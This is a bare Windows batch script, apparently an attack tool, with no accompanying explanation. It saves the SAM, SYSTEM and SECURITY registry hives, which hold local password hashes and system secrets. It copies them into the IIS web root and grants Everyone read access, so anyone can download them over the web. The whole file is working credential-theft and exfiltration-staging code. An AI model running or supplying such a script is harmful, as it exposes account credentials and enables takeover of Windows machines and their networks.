@echo off
reg save HKLM\SAM C:\Windows\Temp\sam.hiv /y
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv /y
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv /y
copy C:\Windows\Temp\sam.hiv C:\inetpub\wwwroot\sam.hiv
copy C:\Windows\Temp\system.hiv C:\inetpub\wwwroot\system.hiv
copy C:\Windows\Temp\security.hiv C:\inetpub\wwwroot\security.hiv
icacls C:\inetpub\wwwroot\*.hiv /grant Everyone:R
